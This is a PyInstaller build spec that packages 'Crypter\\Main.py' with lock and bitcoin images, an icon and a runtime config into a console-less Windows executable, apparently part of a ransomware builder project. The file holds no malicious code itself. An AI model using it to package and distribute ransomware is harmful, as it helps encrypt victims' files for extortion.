# -*- mode: python -*-

block_cipher=None


a = Analysis(['Crypter\\Main.py'],
             pathex=['.\\build'],
             binaries=None,
             datas=[("CrypterBuilder/Resources/lock.bmp", "."),
			 ("CrypterBuilder/Resources/bitcoin.bmp", "."),
			 ("CrypterBuilder/Resources/lock.ico", "."),
			 ("CrypterBuilder/Resources/runtime.cfg", ".")
			 ],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='Main',
          debug=False,
          strip=False,
          upx=False,
          console=False,
		  uac_admin=False,
		  icon=None
		  )
